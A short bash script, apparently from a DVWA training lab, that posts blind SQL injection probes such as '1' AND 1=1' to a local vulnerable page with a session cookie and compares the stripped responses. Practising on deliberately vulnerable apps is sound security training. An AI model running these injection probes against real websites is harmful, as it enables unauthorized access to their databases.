CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high'
BASE='http://10.31.0.87:3000/vulnerabilities/sqli_blind'
for p in "1' AND 1=1 -- x" "1' AND 1=2 -- x" "admin' AND '1'='2"; do
  curl -s -b "$CK" "$BASE/session-input.php" --data-urlencode "id=$p" --data-urlencode "Submit=Submit" -o /dev/null
  RES=$(curl -s -b "$CK" "$BASE" | grep -oE '<pre>.*</pre>' | sed 's/<[^>]*>//g')
  echo "$RES <<== [$p]"
done
